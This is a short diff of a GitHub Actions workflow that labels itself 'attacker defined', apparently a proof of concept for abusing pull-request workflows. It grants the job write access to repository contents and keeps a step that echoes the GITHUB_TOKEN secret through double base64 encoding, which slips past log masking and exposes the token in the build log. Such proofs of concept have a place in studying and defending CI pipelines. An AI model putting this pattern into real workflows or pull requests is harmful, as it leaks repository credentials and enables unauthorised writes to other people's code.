@@ -2,6 +2,8 @@ name: attacker defined
 
 on: pull_request
 
+permissions:
+    contents: write
 
 jobs:
   hello-from-attacker:
@@ -10,7 +12,6 @@ jobs:
       - name: hello
         run: |
           echo "hewo"
-          echo "${{secrets.GITHUB_TOKEN}}" | base64 | base64
           echo "${{secrets.GITHUB_TOKEN}}" | base64 | base64
           echo "sha: ${{github.event.pull_request.head.sha}}"
           echo "github sha ${{github.sha}}"
